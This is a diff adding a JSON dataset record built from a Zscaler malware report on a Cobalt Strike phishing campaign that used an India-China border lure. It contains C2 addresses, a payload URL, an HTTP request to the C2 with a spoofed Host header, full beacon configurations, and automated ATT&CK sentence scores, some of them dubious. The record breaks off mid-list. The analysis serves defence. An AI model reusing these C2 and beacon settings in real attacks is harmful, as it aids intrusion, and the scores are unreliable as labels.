@@ -1,0 +1,1222 @@
+{
+  "original_txt": "Malicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks. The Zscaler ThreatLabZ team recently came across one such attack trying to leverage the current India-China border dispute to lure victims to open an attached malicious document.\nKey points\n- The attack is fileless as no payload is written on disk and no persistence is created.\n- The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode.\n- It uses the DKMC framework to hide communication in plain sight using steganography.\n- It relies on the Cobalt Strike beacon using a malleable C&C profile.\nInfection\nIt appears as if victims were sent a malicious lure document as an email attachment. The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.\nFigure 1: The infection flow of this attack.\nDocument\nThe document contains one line that reads “Geostrategic article for SE Asia Security Analyst,” indicating that the target might be a security analyst for southeast Asia.\nFigure 2: The malicious document containing a new article reference.\nInterestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.\nThough the macro is corrupt, we were able to extract the PowerShell command using static analysis. The code obfuscation is very basic. It just subtracts value 4 to decrypt the PowerShell command.\nFigure 3: The macro command decryption function.\nPart of the PowerShell command after the base64 decoding looks like this:\nFigure 4: Part of the PowerShell code designed to run shellcode.\nAlmost exact code from the DKMC framework is used to run embedded base64 encoded shellcode. The PowerShell script is designed to run the shellcode in 32-bit mode only. It checks if the PowerShell script is running with a 64-bit PowerShell process using the command int pointer size, which will be 8 bytes [64bits] on a 64-bit process. If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.\nInjected shellcode\nThis shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC. Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.\nFigure 5: The shellcode starting with well-known module list access instructions.\nC&C IP: 47.240.73.77\nRequest example:\nGET /avatar_32px.jpg HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\nHost: update.windows.microsoft.com\nConnection: Keep-Alive\nCache-Control: no-cache\nDownloaded payload\nThis GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload. The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.\nFigure 6: The shellcode and payload before decryption.\nFigure 7: The shellcode and payload after decryption.\nThe beacon is configured to point to the following C&C address “userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books” and the same host field and user agent.\nIn another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d\nIn this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah. The shellcode and additional payload are similar except for the C&C addresses. Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.\nAs Cobalt Strike is a well-known commercial tool for red teams, we are not getting into its technical details.\nAttribution\nAs of now, we are not able to attribute this attack to a specific actor with enough confidence. But here are few observations. The group OceanLotus is known to use DKMC, Cobalt Strike, and fileless payloads. But the use of a proper GIF header for shellcode seems to be new for them. On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.\nZscaler Cloud Sandbox report\nFigure 8: The Zscaler Cloud Sandbox report for this malware.\nNote: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.\nIn addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels. Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.\nConclusion\nThreat actors always try to find ways to blend into real traffic. In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website. One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.\nThe Zscaler ThreatLabZ team is continuously monitoring threat actors and ensuring protection against such threats.\nAcknowledgment\nThanks to Adtiya Sharma for providing support in the research.\nMITRE ATT&CK TTP Mapping\n|\nID |\nTechnique |\nDescription |\n|\nT1193 |\nSpearphishing Attachment |\nDocument is delivered as an email attachment |\n|\nT1086 |\nPowerShell |\nUses PowerShell to run shellcode |\n|\nT1204 |\nUser Execution |\nUses doc attachment requiring user interaction |\n|\nT1140 |\nDeobfuscate/Decode Files or Information |\nDecrypt payloads during execution |\n|\nT1027 |\nObfuscated Files or Information |\nUses encrypted payloads |\n|\nT1036 |\nMasquerading |\nUses fake GIF header magic bytes and filename |\n|\nT1043 |\nCommonly Used Port |\n443 |\n|\nT1008 |\nFallback Channels |\nUses more than one C&C |\n|\nT1071 |\nStandard Application Layer Protocol |\nUses HTTPs |\nNote: The TTP list above contains TTP observed during the campaign as a Cobalt Strike beacon has many more features. A complete list of techniques can be found here.\nIOCs\nHashes\ndb89750a7fab01f50b1eefaf83a00060\nbd665cd2c7468002f863558dbe110467\nd8aa162bc3e178558c8829df189bff88\n9c2ee383d235a702c5ad70b1444efb4d\n6208516f759accb98f967ff1369c2f72\n9632bec3bf5caa71d091f08d6701d5d8\na7662d43bb06f31d2152c4f0af039b6e\n5cd9b0858b48d87b9622da8170ce8e5d\nNetwork IOCs\n47.240.73[.]77\n114.67.110[.]37\nuserimage8.360doc[.]com\nimage91.360doc[.]com\nwelcome.toutiao[.]com\nAppendix\nBeacon Config [9632bec3bf5caa71d091f08d6701d5d8]:\n{\n\"BeaconType\": [\n\"HTTPS\"\n],\n\"Port\": 443,\n\"SleepTime\": 2000,\n\"MaxGetSize\": 1048576,\n\"Jitter\": 30,\n\"MaxDNS\": 255,\n\"PublicKey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqkaeSkv+M5R/uTJPUwinLLSQ2X8C/vPURmKkkDXjabFDduIL3hsJ16AWuCdTswnKts0tqvWlVyq8UrGFhg94SILuL7dIWNTBpz3TCFhBWmg+5M9+HN9BDJV5v2MZzSzhzP71unV2uRBqo8N09SREY2qMDA/12+7hTlnzwu4dPgwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\",\n\"C2Server\": \"userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books\",\n\"UserAgent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\",\n\"HttpPostUri\": \"/N4215/adj/aliyun.cn.sr.aps\",\n\"HttpGet_Metadata\": [\n\"Accept: */*\",\n\"Host: update.windows.microsoft.com\",\n\"session-token=\",\n\"skin=noskin;\",\n\"csm-hit=s-24KU11BB82RZSYGJ3BDK|1585758520\",\n\"Cookie\"\n],\n\"HttpPost_Metadata\": [\n\"Accept: */*\",\n\"Content-Type: text/xml\",\n\"X-Requested-With: XMLHttpRequest\",\n\"Host: weathers.bing.com\",\n\"sz=160x600\",\n\"oe=oe=ISO-8859-1;\",\n\"sn\"\n],\n\"SpawnTo\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n\"PipeName\": \"\",\n\"DNS_Idle\": \"0.0.0.0\",\n\"DNS_Sleep\": 0,\n\"SSH_Host\": \"Not Found\",\n\"SSH_Port\": \"Not Found\",\n\"SSH_Username\": \"Not Found\",\n\"SSH_Password_Plaintext\": \"Not Found\",\n\"SSH_Password_Pubkey\": \"Not Found\",\n\"HttpGet_Verb\": \"GET\",\n\"HttpPost_Verb\": \"POST\",\n\"HttpPostChunk\": 0,\n\"Spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n\"Spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n\"CryptoScheme\": 0,\n\"Proxy_Config\": \"Not Found\",\n\"Proxy_User\": \"Not Found\",\n\"Proxy_Password\": \"Not Found\",\n\"Proxy_Behavior\": \"Use IE settings\",\n\"Watermark\": 305419896,\n\"bStageCleanup\": \"False\",\n\"bCFGCaution\": \"False\",\n\"KillDate\": 0,\n\"bProcInject_StartRWX\": \"True\",\n\"bProcInject_UseRWX\": \"True\",\n\"bProcInject_MinAllocSize\": 0,\n\"ProcInject_PrependAppend_x86\": \"Empty\",\n\"ProcInject_PrependAppend_x64\": \"Empty\",\n\"ProcInject_Execute\": [\n\"CreateThread\",\n\"SetThreadContext\",\n\"CreateRemoteThread\",\n\"RtlCreateUserThread\"\n],\n\"ProcInject_AllocationMethod\": \"VirtualAllocEx\",\n\"bUsesCookies\": \"True\",\n\"HostHeader\": \"Host: update.windows.microsoft.com\\r\\n\"\n}\nBeacon Config[a7662d43bb06f31d2152c4f0af039b6e]:\n{\n\"BeaconType\": [\n\"HTTPS\"\n],\n\"Port\": 443,\n\"SleepTime\": 5000,\n\"MaxGetSize\": 2097607,\n\"Jitter\": 30,\n\"MaxDNS\": 255,\n\"PublicKey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDjGBTLCLwB7GPYyUi4sZYnhkQVCfDL4WwPx+YV4YziSbxIzrKAVpZTaiD8srY15LMHBNyE4St+yozCA5JHsYE46tV9A9jiH/oiv0bfcWt5GsYTd5yD5m4FRgAq4awsASqnhLIEtolnofSOhCgQDX+m1hGT00rsK3R8MMl1DOCowIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\",\n\"C2Server\": \"welcome.toutiao.com,/s,image91.360doc.com,/s\",\n\"UserAgent\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\",\n\"HttpPostUri\": \"/S\",\n\"HttpGet_Metadata\": [\n\"Host: image.tencent.com\",\n\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n\"Cookie: BAIDUID=NSAB29B2991BAA:FG=2\",\n\"wd\",\n\"ie=utf-8\"\n],\n\"HttpPost_Metadata\": [\n\"Host: image.tencent.com\",\n\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n\"Cookie: BAIDUID=NSAB29B2991BAA:FG=2\",\n\"wd\",\n\"ie\"\n],\n\"SpawnTo\": \"nM+xbKt6yXlj++MYE0T3iQ==\",\n\"PipeName\": \"\",\n\"DNS_Idle\": \"0.0.0.0\",\n\"DNS_Sleep\": 0,\n\"SSH_Host\": \"Not Found\",\n\"SSH_Port\": \"Not Found\",\n\"SSH_Username\": \"Not Found\",\n\"SSH_Password_Plaintext\": \"Not Found\",\n\"SSH_Password_Pubkey\": \"Not Found\",\n\"HttpGet_Verb\": \"GET\",\n\"HttpPost_Verb\": \"POST\",\n\"HttpPostChunk\": 96,\n\"Spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n\"Spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n\"CryptoScheme\": 0,\n\"Proxy_Config\": \"Not Found\",\n\"Proxy_User\": \"Not Found\",\n\"Proxy_Password\": \"Not Found\",\n\"Proxy_Behavior\": \"Use IE settings\",\n\"Watermark\": 305419896,\n\"bStageCleanup\": \"False\",\n\"bCFGCaution\": \"False\",\n\"KillDate\": 0,\n\"bProcInject_StartRWX\": \"True\",\n\"bProcInject_UseRWX\": \"True\",\n\"bProcInject_MinAllocSize\": 0,\n\"ProcInject_PrependAppend_x86\": \"Empty\",\n\"ProcInject_PrependAppend_x64\": \"Empty\",\n\"ProcInject_Execute\": [\n\"CreateThread\",\n\"SetThreadContext\",\n\"CreateRemoteThread\",\n\"RtlCreateUserThread\"\n],\n\"ProcInject_AllocationMethod\": \"VirtualAllocEx\",\n\"bUsesCookies\": \"True\",\n\"HostHeader\": \"\"\n}",
+  "sanitized_txt": "Malicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks. The Zscaler ThreatLabZ team recently came across one such attack trying to leverage the current India-China border dispute to lure victims to open an attached malicious document.\nKey points - The attack is fileless as no payload is written on disk and no persistence is created.\n- The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode.\n- It uses the DKMC framework to hide communication in plain sight using steganography.\n- It relies on the Cobalt Strike beacon using a malleable C&C profile.\nInfection It appears as if victims were sent a malicious lure document as an email attachment. The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.\nFigure 1: The infection flow of this attack.\nDocument The document contains one line that reads “Geostrategic article for SE Asia Security Analyst,” indicating that the target might be a security analyst for southeast Asia.\nFigure 2: The malicious document containing a new article reference.\nInterestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.\nThough the macro is corrupt, we were able to extract the PowerShell command using static analysis. The code obfuscation is very basic. It just subtracts value 4 to decrypt the PowerShell command.\nFigure 3: The macro command decryption function.\nPart of the PowerShell command after the base64 decoding looks like this:\nFigure 4: Part of the PowerShell code designed to run shellcode.\nAlmost exact code from the DKMC framework is used to run embedded base64 encoded shellcode. The PowerShell script is designed to run the shellcode in 32-bit mode only. It checks if the PowerShell script is running with a 64-bit PowerShell process using the command int pointer size, which will be 8 bytes [64bits] on a 64-bit process. If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.\nInjected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC. Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.\nFigure 5: The shellcode starting with well-known module list access instructions.\nC&C IP: 47.240.73.77 Request example:\nGET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload. The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.\nFigure 6: The shellcode and payload before decryption.\nFigure 7: The shellcode and payload after decryption.\nThe beacon is configured to point to the following C&C address “userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books” and the same host field and user agent.\nIn another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah. The shellcode and additional payload are similar except for the C&C addresses. Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.\nAs Cobalt Strike is a well-known commercial tool for red teams, we are not getting into its technical details.\nAttribution As of now, we are not able to attribute this attack to a specific actor with enough confidence. But here are few observations. The group OceanLotus is known to use DKMC, Cobalt Strike, and fileless payloads. But the use of a proper GIF header for shellcode seems to be new for them. On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.\nZscaler Cloud Sandbox report Figure 8: The Zscaler Cloud Sandbox report for this malware.\nNote: The document will crash in this case but if fixed to run, the Zscaler Cloud Sandbox will block its activity.\nIn addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels. Check out our Threat Library for more details about Win32.Backdoor.CobaltStrike.\nConclusion Threat actors always try to find ways to blend into real traffic. In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website. One such evasion trick that we covered in our earlier blog was the use of FakeTLS header.\nThe Zscaler ThreatLabZ team is continuously monitoring threat actors and ensuring protection against such threats.\nAcknowledgment Thanks to Adtiya Sharma for providing support in the research.\nIOCs Hashes db89750a7fab01f50b1eefaf83a00060 bd665cd2c7468002f863558dbe110467 d8aa162bc3e178558c8829df189bff88 9c2ee383d235a702c5ad70b1444efb4d 6208516f759accb98f967ff1369c2f72 9632bec3bf5caa71d091f08d6701d5d8 a7662d43bb06f31d2152c4f0af039b6e 5cd9b0858b48d87b9622da8170ce8e5d Network IOCs 47.240.73[.]77 114.67.110[.]37 userimage8.360doc[.]com image91.360doc[.]com welcome.toutiao[.]com Appendix Beacon Config [9632bec3bf5caa71d091f08d6701d5d8]:\n{ \"BeaconType\": [ \"HTTPS\" ], \"Port\": 443, \"SleepTime\": 2000, \"MaxGetSize\": 1048576, \"Jitter\": 30, \"MaxDNS\": 255, \"PublicKey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqkaeSkv+M5R/uTJPUwinLLSQ2X8C/vPURmKkkDXjabFDduIL3hsJ16AWuCdTswnKts0tqvWlVyq8UrGFhg94SILuL7dIWNTBpz3TCFhBWmg+5M9+HN9BDJV5v2MZzSzhzP71unV2uRBqo8N09SREY2qMDA/12+7hTlnzwu4dPgwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\", \"C2Server\": \"userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books\", \"UserAgent\": \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\", \"HttpPostUri\": \"/N4215/adj/aliyun.cn.sr.aps\", \"HttpGet_Metadata\": [ \"Accept: */*\", \"Host: update.windows.microsoft.com\", \"session-token=\", \"skin=noskin;\", \"csm-hit=s-24KU11BB82RZSYGJ3BDK|1585758520\", \"Cookie\" ], \"HttpPost_Metadata\": [ \"Accept: */*\", \"Content-Type: text/xml\", \"X-Requested-With: XMLHttpRequest\", \"Host: weathers.bing.com\", \"sz=160x600\", \"oe=oe=ISO-8859-1;\", \"sn\" ], \"SpawnTo\": \"AAAAAAAAAAAAAAAAAAAAAA==\", \"PipeName\": \"\", \"DNS_Idle\": \"0.0.0.0\", \"DNS_Sleep\": 0, \"SSH_Host\": \"Not Found\", \"SSH_Port\": \"Not Found\", \"SSH_Username\": \"Not Found\", \"SSH_Password_Plaintext\": \"Not Found\", \"SSH_Password_Pubkey\": \"Not Found\", \"HttpGet_Verb\": \"GET\", \"HttpPost_Verb\": \"POST\", \"HttpPostChunk\": 0, \"Spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\", \"Spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\", \"CryptoScheme\": 0, \"Proxy_Config\": \"Not Found\", \"Proxy_User\": \"Not Found\", \"Proxy_Password\": \"Not Found\", \"Proxy_Behavior\": \"Use IE settings\", \"Watermark\": 305419896, \"bStageCleanup\": \"False\", \"bCFGCaution\": \"False\", \"KillDate\": 0, \"bProcInject_StartRWX\": \"True\", \"bProcInject_UseRWX\": \"True\", \"bProcInject_MinAllocSize\": 0, \"ProcInject_PrependAppend_x86\": \"Empty\", \"ProcInject_PrependAppend_x64\": \"Empty\", \"ProcInject_Execute\": [ \"CreateThread\", \"SetThreadContext\", \"CreateRemoteThread\", \"RtlCreateUserThread\" ], \"ProcInject_AllocationMethod\": \"VirtualAllocEx\", \"bUsesCookies\": \"True\", \"HostHeader\": \"Host: update.windows.microsoft.com\\r\\n\" } Beacon Config[a7662d43bb06f31d2152c4f0af039b6e]:\n{ \"BeaconType\": [ \"HTTPS\" ], \"Port\": 443, \"SleepTime\": 5000, \"MaxGetSize\": 2097607, \"Jitter\": 30, \"MaxDNS\": 255, \"PublicKey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDDjGBTLCLwB7GPYyUi4sZYnhkQVCfDL4WwPx+YV4YziSbxIzrKAVpZTaiD8srY15LMHBNyE4St+yozCA5JHsYE46tV9A9jiH/oiv0bfcWt5GsYTd5yD5m4FRgAq4awsASqnhLIEtolnofSOhCgQDX+m1hGT00rsK3R8MMl1DOCowIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\", \"C2Server\": \"welcome.toutiao.com,/s,image91.360doc.com,/s\", \"UserAgent\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\", \"HttpPostUri\": \"/S\", \"HttpGet_Metadata\": [ \"Host: image.tencent.com\", \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Cookie: BAIDUID=NSAB29B2991BAA:FG=2\", \"wd\", \"ie=utf-8\" ], \"HttpPost_Metadata\": [ \"Host: image.tencent.com\", \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Cookie: BAIDUID=NSAB29B2991BAA:FG=2\", \"wd\", \"ie\" ], \"SpawnTo\": \"nM+xbKt6yXlj++MYE0T3iQ==\", \"PipeName\": \"\", \"DNS_Idle\": \"0.0.0.0\", \"DNS_Sleep\": 0, \"SSH_Host\": \"Not Found\", \"SSH_Port\": \"Not Found\", \"SSH_Username\": \"Not Found\", \"SSH_Password_Plaintext\": \"Not Found\", \"SSH_Password_Pubkey\": \"Not Found\", \"HttpGet_Verb\": \"GET\", \"HttpPost_Verb\": \"POST\", \"HttpPostChunk\": 96, \"Spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\", \"Spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\", \"CryptoScheme\": 0, \"Proxy_Config\": \"Not Found\", \"Proxy_User\": \"Not Found\", \"Proxy_Password\": \"Not Found\", \"Proxy_Behavior\": \"Use IE settings\", \"Watermark\": 305419896, \"bStageCleanup\": \"False\", \"bCFGCaution\": \"False\", \"KillDate\": 0, \"bProcInject_StartRWX\": \"True\", \"bProcInject_UseRWX\": \"True\", \"bProcInject_MinAllocSize\": 0, \"ProcInject_PrependAppend_x86\": \"Empty\", \"ProcInject_PrependAppend_x64\": \"Empty\", \"ProcInject_Execute\": [ \"CreateThread\", \"SetThreadContext\", \"CreateRemoteThread\", \"RtlCreateUserThread\" ], \"ProcInject_AllocationMethod\": \"VirtualAllocEx\", \"bUsesCookies\": \"True\", \"HostHeader\": \"\" }",
+  "ID_list": [
+    "T1008",
+    "T1027",
+    "T1036",
+    "T1043",
+    "T1071",
+    "T1086",
+    "T1140",
+    "T1193",
+    "T1204"
+  ],
+  "Name_list": [
+    "Command and Control",
+    "Execution",
+    "Persistence",
+    "Phishing",
+    "Rundll32"
+  ],
+  "TTP_sentences": {
+    "T1008": [
+      {
+        "sentence": "Malicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks.",
+        "score": 0.3259
+      },
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.6304
+      },
+      {
+        "sentence": "The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.",
+        "score": 0.3366
+      },
+      {
+        "sentence": "Figure 1: The infection flow of this attack.",
+        "score": 0.4049
+      },
+      {
+        "sentence": "Figure 2: The malicious document containing a new article reference.",
+        "score": 0.3141
+      },
+      {
+        "sentence": "Though the macro is corrupt, we were able to extract the PowerShell command using static analysis.",
+        "score": 0.3696
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.3308
+      },
+      {
+        "sentence": "It just subtracts value 4 to decrypt the PowerShell command.",
+        "score": 0.3346
+      },
+      {
+        "sentence": "Figure 3: The macro command decryption function.",
+        "score": 0.3626
+      },
+      {
+        "sentence": "Part of the PowerShell command after the base64 decoding looks like this: Figure 4: Part of the PowerShell code designed to run shellcode.",
+        "score": 0.3667
+      },
+      {
+        "sentence": "Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode.",
+        "score": 0.3615
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.38
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.4649
+      },
+      {
+        "sentence": "C&C IP: 47.240.73.77 Request example: GET /avatar_32px.jpg HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Host: update.windows.microsoft.com Connection: Keep-Alive Cache-Control: no-cache Downloaded payload This GIF file, just after the GIF magic bytes [“GIF89a” in this case, which is also a valid assembly instruction] contains a shellcode followed by an XOR-encrypted payload.",
+        "score": 0.4544
+      },
+      {
+        "sentence": "The shellcode decrypts and executes this payload, which turns out to be a Cobalt Strike beacon.",
+        "score": 0.4145
+      },
+      {
+        "sentence": "Figure 6: The shellcode and payload before decryption.",
+        "score": 0.3922
+      },
+      {
+        "sentence": "Figure 7: The shellcode and payload after decryption.",
+        "score": 0.4021
+      },
+      {
+        "sentence": "The beacon is configured to point to the following C&C address “userimage8.360doc.com,/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books” and the same host field and user agent.",
+        "score": 0.5389
+      },
+      {
+        "sentence": "In another instance, we found a .NET payload, which injects an RSA-encrypted payload into a notepad.exe file after decryption with the MD5: 9c2ee383d235a702c5ad70b1444efb4d In this case, the beacon payload is downloaded from https://114.67.110[.]37/QBah.",
+        "score": 0.365
+      },
+      {
+        "sentence": "The shellcode and additional payload are similar except for the C&C addresses.",
+        "score": 0.5339
+      },
+      {
+        "sentence": "Noticeably, both beacon DLLs use a 360doc.com-based C&C, and the watermark is exactly the same in both: 305419896.",
+        "score": 0.5665
+      },
+      {
+        "sentence": "As Cobalt Strike is a well-known commercial tool for red teams, we are not getting into its technical details.",
+        "score": 0.3352
+      },
+      {
+        "sentence": "Attribution As of now, we are not able to attribute this attack to a specific actor with enough confidence.",
+        "score": 0.4076
+      },
+      {
+        "sentence": "On the other hand, the watermark value (305419896) found in the beacon configuration has also been used by the Trickbot Group.",
+        "score": 0.3935
+      },
+      {
+        "sentence": "Conclusion Threat actors always try to find ways to blend into real traffic.",
+        "score": 0.3984
+      },
+      {
+        "sentence": "In this case. they are using an SSL/TLS connection and a host header set to a legitimate Microsoft website.",
+        "score": 0.4189
+      },
+      {
+        "sentence": "Acknowledgment Thanks to Adtiya Sharma for providing support in the research.",
+        "score": 0.3763
+      },
+      {
+        "sentence": "A complete list of techniques can be found here.",
+        "score": 0.3922
+      }
+    ],
+    "T1027": [
+      {
+        "sentence": "Malicious threat actors are always ready to take advantage of current affairs to maximize the success rate of their attacks.",
+        "score": 0.3377
+      },
+      {
+        "sentence": "The Zscaler ThreatLabZ team recently came across one such attack trying to leverage the current India-China border dispute to lure victims to open an attached malicious document.",
+        "score": 0.4869
+      },
+      {
+        "sentence": "Key points - The attack is fileless as no payload is written on disk and no persistence is created. - The shellcode uses a fake HTTP host field while communicating with the command and control (C&C) server to download the shellcode. - It uses the DKMC framework to hide communication in plain sight using steganography. - It relies on the Cobalt Strike beacon using a malleable C&C profile.",
+        "score": 0.5281
+      },
+      {
+        "sentence": "Infection It appears as if victims were sent a malicious lure document as an email attachment.",
+        "score": 0.4949
+      },
+      {
+        "sentence": "The document is named “India-China border tensions.doc” and contains an article by The Times of India article about the same topic.",
+        "score": 0.4713
+      },
+      {
+        "sentence": "Figure 1: The infection flow of this attack.",
+        "score": 0.4139
+      },
+      {
+        "sentence": "Document The document contains one line that reads “Geostrategic article for SE Asia Security Analyst,” indicating that the target might be a security analyst for southeast Asia.",
+        "score": 0.4325
+      },
+      {
+        "sentence": "Figure 2: The malicious document containing a new article reference.",
+        "score": 0.5493
+      },
+      {
+        "sentence": "Interestingly, the document contained corrupted macro code leading us to believe that it was built in a hurry using some automated macro obfuscation tool without proper testing.",
+        "score": 0.7679
+      },
+      {
+        "sentence": "Though the macro is corrupt, we were able to extract the PowerShell command using static analysis.",
+        "score": 0.6684
+      },
+      {
+        "sentence": "The code obfuscation is very basic.",
+        "score": 0.7183
+      },
+      {
+        "sentence": "It just subtracts value 4 to decrypt the PowerShell command.",
+        "score": 0.6
+      },
+      {
+        "sentence": "Figure 3: The macro command decryption function.",
+        "score": 0.516
+      },
+      {
+        "sentence": "Part of the PowerShell command after the base64 decoding looks like this: Figure 4: Part of the PowerShell code designed to run shellcode.",
+        "score": 0.6338
+      },
+      {
+        "sentence": "Almost exact code from the DKMC framework is used to run embedded base64 encoded shellcode.",
+        "score": 0.75
+      },
+      {
+        "sentence": "The PowerShell script is designed to run the shellcode in 32-bit mode only.",
+        "score": 0.5393
+      },
+      {
+        "sentence": "It checks if the PowerShell script is running with a 64-bit PowerShell process using the command int pointer size, which will be 8 bytes [64bits] on a 64-bit process.",
+        "score": 0.3149
+      },
+      {
+        "sentence": "If that is the case, then it tries to run the PowerShell in 32-bit mode with the shellcode injection script code as an argument.",
+        "score": 0.4414
+      },
+      {
+        "sentence": "Injected shellcode This shellcode on execution downloads another shellcode but with a valid GIF header, again borrowing a technique from DKMC.",
+        "score": 0.5183
+      },
+      {
+        "sentence": "Interestingly, this shellcode uses a fake HTML host header and a predefined User-Agent field, in this case, to download a GIF payload from the C&C IP over HTTPS.",
+        "score": 0.4645
+      },
+      {
+        "sentence": "Figure 5: The shellcode starting with well-known module list access instructions.",
+        "score": 0.4693
+      },
+      {
